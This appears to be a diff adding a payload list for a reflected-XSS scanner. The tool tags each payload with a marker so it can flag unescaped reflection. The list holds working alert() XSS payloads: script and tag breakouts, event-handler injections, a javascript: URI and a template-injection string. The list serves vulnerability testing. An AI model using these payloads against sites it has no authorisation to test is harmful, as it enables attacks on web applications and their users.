@@ -1,0 +1,21 @@
+# Reflected XSS payloads — flagged when the payload reflects UN-escaped.
+# The tool injects a unique marker (PHXMARK) so reflection is unambiguous.
+# One payload per line. # comments ignored. Add your own freely.
+PHXMARK"><svg/onload=alert(1)>
+PHXMARK"><img src=x onerror=alert(1)>
+PHXMARK'><svg/onload=alert(1)>
+PHXMARK</script><script>alert(1)</script>
+"><svg/onload=alert(1)>PHXMARK
+'><img src=x onerror=alert(1)>PHXMARK
+<svg/onload=alert(1)>PHXMARK
+<script>alert(1)</script>PHXMARK
+"><script>alert(document.domain)</script>
+javascript:alert(1)//PHXMARK
+"><body onload=alert(1)>PHXMARK
+'"><iframe src=javascript:alert(1)>PHXMARK
+<img src=x onerror=alert(1)>
+"><input autofocus onfocus=alert(1)>PHXMARK
+<details open ontoggle=alert(1)>PHXMARK
+"><marquee onstart=alert(1)>PHXMARK
+</title><svg/onload=alert(1)>PHXMARK
+{{constructor.constructor('alert(1)')()}}PHXMARK
